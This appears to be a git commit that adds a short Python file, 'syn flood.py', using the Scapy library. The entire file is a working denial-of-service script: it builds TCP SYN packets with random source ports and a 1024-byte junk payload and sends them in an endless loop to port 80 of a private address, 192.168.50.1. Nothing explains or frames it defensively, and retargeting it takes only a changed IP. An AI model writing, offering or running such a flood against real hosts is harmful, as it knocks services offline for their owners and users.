4e5387a5c02d9b314553b7e1314fd580d93bd6e7
netanelTr2008 <netaneltr2008@gmail.com>
2024-11-29 19:47:46 +0200

    first commit

---
+++ syn flood.py
@@ -0,0 +1,10 @@
+from scapy.all import *
+
+target_ip = "192.168.50.1"
+target_port = 80 
+
+ip = IP(dst=target_ip)
+tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+raw = Raw(b"X"*1024)
+p = ip / tcp / raw
+send(p, loop=1, verbose=0)
